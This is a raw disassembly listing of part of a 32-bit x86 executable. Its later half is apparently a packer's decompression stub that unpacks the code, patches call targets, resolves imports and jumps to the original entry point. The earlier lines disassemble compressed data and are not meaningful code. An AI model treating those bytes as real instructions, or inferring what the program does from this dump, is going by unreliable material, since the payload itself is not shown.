  418043:	0d 16 99 88 bc       	or     $0xbc889916,%eax
  418048:	d3 b0 46 36 57 4e    	shll   %cl,0x4e573646(%eax)
  41804e:	0f f6 6d c2          	psadbw -0x3e(%ebp),%mm5
  418052:	22 d5                	and    %ch,%dl
  418054:	11 4f a4             	adc    %ecx,-0x5c(%edi)
  418057:	6e                   	outsb  %ds:(%esi),(%dx)
  418058:	4b                   	dec    %ebx
  418059:	65 79 0e             	gs jns 0x41806a
  41805c:	b3 98                	mov    $0x98,%bl
  41805e:	bb 1d 46 1a 73       	mov    $0x731a461d,%ebx
  418063:	68 0f 0c bb 39       	push   $0x39bb0c0f
  418068:	7b 2f                	jnp    0x418099
  41806a:	60                   	pusha
  41806b:	1d bf 0f 64 5c       	sbb    $0x5c640fbf,%eax
  418070:	e6 b2                	out    %al,$0xb2
  418072:	55                   	push   %ebp
  418073:	36 54                	ss push %esp
  418075:	36 a6                	cmpsb  %es:(%edi),%ss:(%esi)
  418077:	49                   	dec    %ecx
  418078:	87 52 9c             	xchg   %edx,-0x64(%edx)
  41807b:	6c                   	insb   (%dx),%es:(%edi)
  41807c:	39 c3                	cmp    %eax,%ebx
  41807e:	22 eb                	and    %bl,%ch
  418080:	dc 69 b6             	fsubrl -0x4a(%ecx)
  418083:	17                   	pop    %ss
  418084:	b3 4c                	mov    $0x4c,%bl
  418086:	e5 28                	in     $0x28,%eax
  418088:	62                   	(bad)
  418089:	d0 f7                	shl    $1,%bh
  41808b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  41808c:	98                   	cwtl
  41808d:	70 72                	jo     0x418101
  41808f:	64 3f                	fs aas
  418091:	76 42                	jbe    0x4180d5
  418093:	6f                   	outsl  %ds:(%esi),(%dx)
  418094:	4b                   	dec    %ebx
  418095:	3b 67 4f             	cmp    0x4f(%edi),%esp
  418098:	ed                   	in     (%dx),%eax
  418099:	43                   	inc    %ebx
  41809a:	68 17 bf 41 31       	push   $0x3141bf17
  41809f:	f0 20 f8             	lock and %bh,%al
  4180a2:	bb 63 03 00 50       	mov    $0x50000363,%ebx
  4180a7:	45                   	inc    %ebp
  4180a8:	4b                   	dec    %ebx
  4180a9:	01 08                	add    %ecx,(%eax)
  4180ab:	00 19                	add    %bl,(%ecx)
  4180ad:	5e                   	pop    %esi
  4180ae:	42                   	inc    %edx
  4180af:	2a b2 fc 1f 04 78    	sub    0x78041ffc(%edx),%dh
  4180b5:	e0 00                	loopne 0x4180b7
  4180b7:	8f 81 0b 01 02 19    	pop    0x1902010b(%ecx)
  4180bd:	00 98 18 9c 7d dd    	add    %bl,-0x228263e8(%eax)
  4180c3:	37                   	aaa
  4180c4:	30 8c 10 03 b0 0d 40 	xor    %cl,0x400db003(%eax,%edx,1)
  4180cb:	0b 02                	or     (%edx),%eax
  4180cd:	64 37                	fs aaa
  4180cf:	0b b6 04 33 07 0c    	or     0xc073304(%esi),%esi
  4180d5:	70 01                	jo     0x4180d8
  4180d7:	67 b0 33             	addr16 mov $0x33,%al
  4180da:	97                   	xchg   %eax,%edi
  4180db:	1e                   	push   %ds
  4180dc:	34 40                	xor    $0x40,%al
  4180de:	07                   	pop    %es
  4180df:	10 74 97 b3          	adc    %dh,-0x4d(%edi,%edx,4)
  4180e3:	64 06                	fs push %es
  4180e5:	2f                   	das
  4180e6:	20 0a                	and    %cl,(%edx)
  4180e8:	07                   	pop    %es
  4180e9:	37                   	aaa
  4180ea:	60                   	pusha
  4180eb:	c8 5f 19 d0          	enter  $0x195f,$0xd0
  4180ef:	02 31                	add    (%ecx),%dh
  4180f1:	50                   	push   %eax
  4180f2:	01 00                	add    %eax,(%eax)
  4180f4:	d8 08                	fmuls  (%eax)
  4180f6:	fc                   	cld
  4180f7:	2a e4                	sub    %ah,%ah
  4180f9:	57                   	push   %edi
  4180fa:	40                   	inc    %eax
  4180fb:	01 00                	add    %eax,(%eax)
  4180fd:	18 43 4f             	sbb    %al,0x4f(%ebx)
  418100:	44                   	inc    %esp
  418101:	45                   	inc    %ebp
  418102:	64 cb                	fs lret
  418104:	06                   	push   %es
  418105:	db 74 96 90          	(bad) -0x70(%esi,%edx,4)
  418109:	98                   	cwtl
  41810a:	c4 9a 5f b0 cf bb    	les    -0x44304fa1(%edx),%ebx
  418110:	95                   	xchg   %eax,%ebp
  418111:	44                   	inc    %esp
  418112:	41                   	inc    %ecx
  418113:	54                   	push   %esp
  418114:	41                   	inc    %ecx
  418115:	58                   	pop    %eax
  418116:	01 fb                	add    %edi,%ebx
  418118:	a3 9c 39 f2 2d       	mov    %eax,0x2df2399c
  41811d:	64 82 76 c0 42       	xorb   $0x42,%fs:-0x40(%esi)
  418122:	53                   	push   %ebx
  418123:	53                   	push   %ebx
  418124:	bd 5f e0 29 19       	mov    $0x1929e05f,%ebp
  418129:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  41812a:	c0 9e c0 2e 69 6b ce 	rcrb   $0xce,0x6b692ec0(%esi)
  418131:	ba 0a 1d 00 f3       	mov    $0xf3001d0a,%edx
  418136:	20 08                	and    %cl,(%eax)
  418138:	27                   	daa
  418139:	9e                   	sahf
  41813a:	2b 9e 2b 40 74 e3    	sub    -0x1c8bbfd5(%esi),%ebx
  418140:	1e                   	push   %ds
  418141:	32 80 9c ec 4f 30    	xor    0x304fec9c(%eax),%al
  418147:	01 a6 72 29 39 9b    	add    %esp,-0x64c6d68e(%esi)
  41814d:	70 18                	jo     0x418167
  41814f:	0b 9f a6 74 27 9c    	or     -0x63d88b5a(%edi),%ebx
  418155:	b6 50                	mov    $0x50,%dh
  418157:	27                   	daa
  418158:	65 18 4b 50          	sbb    %cl,%gs:0x50(%ebx)
  41815c:	27                   	daa
  41815d:	0a 78 ee             	or     -0x12(%eax),%bh
  418160:	01 d2                	add    %edx,%edx
  418162:	a8 73                	test   $0x73,%al
  418164:	72 26                	jb     0x41818c
  418166:	47                   	inc    %edi
  418167:	37                   	aaa
  418168:	b6 b2                	mov    $0xb2,%dh
  41816a:	4b                   	dec    %ebx
  41816b:	93                   	xchg   %eax,%ebx
  41816c:	b2 27                	mov    $0x27,%dl
  41816e:	1b 22                	sbb    (%edx),%esp
  418170:	97                   	xchg   %eax,%edi
  418171:	00 00                	add    %al,(%eax)
  418173:	00 f8                	add    %bh,%al
  418175:	81 64 01 00 00 24 00 	andl   $0x2400,0x0(%ecx,%eax,1)
  41817c:	00 
  41817d:	ff 00                	incl   (%eax)
  41817f:	00 60 be             	add    %ah,-0x42(%eax)
  418182:	00 30                	add    %dh,(%eax)
  418184:	41                   	inc    %ecx
  418185:	00 8d be 00 e0 fe    	add    %cl,-0x11fff42(%ebp)
  41818b:	ff 57 83             	call   *-0x7d(%edi)
  41818e:	cd ff                	int    $0xff
  418190:	eb 10                	jmp    0x4181a2
  418192:	90                   	nop
  418193:	90                   	nop
  418194:	90                   	nop
  418195:	90                   	nop
  418196:	90                   	nop
  418197:	90                   	nop
  418198:	8a 06                	mov    (%esi),%al
  41819a:	46                   	inc    %esi
  41819b:	88 07                	mov    %al,(%edi)
  41819d:	47                   	inc    %edi
  41819e:	01 db                	add    %ebx,%ebx
  4181a0:	75 07                	jne    0x4181a9
  4181a2:	8b 1e                	mov    (%esi),%ebx
  4181a4:	83 ee fc             	sub    $0xfffffffc,%esi
  4181a7:	11 db                	adc    %ebx,%ebx
  4181a9:	72 ed                	jb     0x418198
  4181ab:	b8 01 00 00 00       	mov    $0x1,%eax
  4181b0:	01 db                	add    %ebx,%ebx
  4181b2:	75 07                	jne    0x4181bb
  4181b4:	8b 1e                	mov    (%esi),%ebx
  4181b6:	83 ee fc             	sub    $0xfffffffc,%esi
  4181b9:	11 db                	adc    %ebx,%ebx
  4181bb:	11 c0                	adc    %eax,%eax
  4181bd:	01 db                	add    %ebx,%ebx
  4181bf:	73 ef                	jae    0x4181b0
  4181c1:	75 09                	jne    0x4181cc
  4181c3:	8b 1e                	mov    (%esi),%ebx
  4181c5:	83 ee fc             	sub    $0xfffffffc,%esi
  4181c8:	11 db                	adc    %ebx,%ebx
  4181ca:	73 e4                	jae    0x4181b0
  4181cc:	31 c9                	xor    %ecx,%ecx
  4181ce:	83 e8 03             	sub    $0x3,%eax
  4181d1:	72 0d                	jb     0x4181e0
  4181d3:	c1 e0 08             	shl    $0x8,%eax
  4181d6:	8a 06                	mov    (%esi),%al
  4181d8:	46                   	inc    %esi
  4181d9:	83 f0 ff             	xor    $0xffffffff,%eax
  4181dc:	74 74                	je     0x418252
  4181de:	89 c5                	mov    %eax,%ebp
  4181e0:	01 db                	add    %ebx,%ebx
  4181e2:	75 07                	jne    0x4181eb
  4181e4:	8b 1e                	mov    (%esi),%ebx
  4181e6:	83 ee fc             	sub    $0xfffffffc,%esi
  4181e9:	11 db                	adc    %ebx,%ebx
  4181eb:	11 c9                	adc    %ecx,%ecx
  4181ed:	01 db                	add    %ebx,%ebx
  4181ef:	75 07                	jne    0x4181f8
  4181f1:	8b 1e                	mov    (%esi),%ebx
  4181f3:	83 ee fc             	sub    $0xfffffffc,%esi
  4181f6:	11 db                	adc    %ebx,%ebx
  4181f8:	11 c9                	adc    %ecx,%ecx
  4181fa:	75 20                	jne    0x41821c
  4181fc:	41                   	inc    %ecx
  4181fd:	01 db                	add    %ebx,%ebx
  4181ff:	75 07                	jne    0x418208
  418201:	8b 1e                	mov    (%esi),%ebx
  418203:	83 ee fc             	sub    $0xfffffffc,%esi
  418206:	11 db                	adc    %ebx,%ebx
  418208:	11 c9                	adc    %ecx,%ecx
  41820a:	01 db                	add    %ebx,%ebx
  41820c:	73 ef                	jae    0x4181fd
  41820e:	75 09                	jne    0x418219
  418210:	8b 1e                	mov    (%esi),%ebx
  418212:	83 ee fc             	sub    $0xfffffffc,%esi
  418215:	11 db                	adc    %ebx,%ebx
  418217:	73 e4                	jae    0x4181fd
  418219:	83 c1 02             	add    $0x2,%ecx
  41821c:	81 fd 00 f3 ff ff    	cmp    $0xfffff300,%ebp
  418222:	83 d1 01             	adc    $0x1,%ecx
  418225:	8d 14 2f             	lea    (%edi,%ebp,1),%edx
  418228:	83 fd fc             	cmp    $0xfffffffc,%ebp
  41822b:	76 0f                	jbe    0x41823c
  41822d:	8a 02                	mov    (%edx),%al
  41822f:	42                   	inc    %edx
  418230:	88 07                	mov    %al,(%edi)
  418232:	47                   	inc    %edi
  418233:	49                   	dec    %ecx
  418234:	75 f7                	jne    0x41822d
  418236:	e9 63 ff ff ff       	jmp    0x41819e
  41823b:	90                   	nop
  41823c:	8b 02                	mov    (%edx),%eax
  41823e:	83 c2 04             	add    $0x4,%edx
  418241:	89 07                	mov    %eax,(%edi)
  418243:	83 c7 04             	add    $0x4,%edi
  418246:	83 e9 04             	sub    $0x4,%ecx
  418249:	77 f1                	ja     0x41823c
  41824b:	01 cf                	add    %ecx,%edi
  41824d:	e9 4c ff ff ff       	jmp    0x41819e
  418252:	5e                   	pop    %esi
  418253:	89 f7                	mov    %esi,%edi
  418255:	b9 b2 03 00 00       	mov    $0x3b2,%ecx
  41825a:	8a 07                	mov    (%edi),%al
  41825c:	47                   	inc    %edi
  41825d:	2c e8                	sub    $0xe8,%al
  41825f:	3c 01                	cmp    $0x1,%al
  418261:	77 f7                	ja     0x41825a
  418263:	80 3f 00             	cmpb   $0x0,(%edi)
  418266:	75 f2                	jne    0x41825a
  418268:	8b 07                	mov    (%edi),%eax
  41826a:	8a 5f 04             	mov    0x4(%edi),%bl
  41826d:	66 c1 e8 08          	shr    $0x8,%ax
  418271:	c1 c0 10             	rol    $0x10,%eax
  418274:	86 c4                	xchg   %al,%ah
  418276:	29 f8                	sub    %edi,%eax
  418278:	80 eb e8             	sub    $0xe8,%bl
  41827b:	01 f0                	add    %esi,%eax
  41827d:	89 07                	mov    %eax,(%edi)
  41827f:	83 c7 05             	add    $0x5,%edi
  418282:	89 d8                	mov    %ebx,%eax
  418284:	e2 d9                	loop   0x41825f
  418286:	8d be 00 60 01 00    	lea    0x16000(%esi),%edi
  41828c:	8b 07                	mov    (%edi),%eax
  41828e:	09 c0                	or     %eax,%eax
  418290:	74 3c                	je     0x4182ce
  418292:	8b 5f 04             	mov    0x4(%edi),%ebx
  418295:	8d 84 30 b0 80 01 00 	lea    0x180b0(%eax,%esi,1),%eax
  41829c:	01 f3                	add    %esi,%ebx
  41829e:	50                   	push   %eax
  41829f:	83 c7 08             	add    $0x8,%edi
  4182a2:	ff 96 14 81 01 00    	call   *0x18114(%esi)
  4182a8:	95                   	xchg   %eax,%ebp
  4182a9:	8a 07                	mov    (%edi),%al
  4182ab:	47                   	inc    %edi
  4182ac:	08 c0                	or     %al,%al
  4182ae:	74 dc                	je     0x41828c
  4182b0:	89 f9                	mov    %edi,%ecx
  4182b2:	57                   	push   %edi
  4182b3:	48                   	dec    %eax
  4182b4:	f2 ae                	repnz scas %es:(%edi),%al
  4182b6:	55                   	push   %ebp
  4182b7:	ff 96 18 81 01 00    	call   *0x18118(%esi)
  4182bd:	09 c0                	or     %eax,%eax
  4182bf:	74 07                	je     0x4182c8
  4182c1:	89 03                	mov    %eax,(%ebx)
  4182c3:	83 c3 04             	add    $0x4,%ebx
  4182c6:	eb e1                	jmp    0x4182a9
  4182c8:	ff 96 1c 81 01 00    	call   *0x1811c(%esi)
  4182ce:	61                   	popa
  4182cf:	e9 5c 23 ff ff       	jmp    0x40a630
  4182d4:	ec                   	in     (%dx),%al
  4182d5:	82 41 00 f4          	addb   $0xf4,0x0(%ecx)
  4182d9:	82 41 00 b0          	addb   $0xb0,0x0(%ecx)
  4182dd:	b0 40                	mov    $0x40,%al
	...
